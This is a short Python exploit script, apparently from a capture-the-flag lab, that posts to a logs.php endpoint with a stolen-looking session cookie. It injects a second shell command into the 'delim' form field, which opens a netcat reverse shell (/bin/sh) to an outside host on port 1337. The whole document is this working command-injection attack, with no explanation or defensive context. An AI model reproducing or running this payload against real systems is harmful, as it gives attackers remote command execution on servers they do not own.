import requests

url = "http://10.10.11.104/logs.php"

headers = {"Cookie":"PHPSESSID=m3nqaq6iu4kbl42pcrff5gdbsv"}

data = {"delim":'''comma;nc -e /bin/sh 10.10.16.10 1337'''}
x = requests.post(url,headers=headers,data=data)

print(x.text)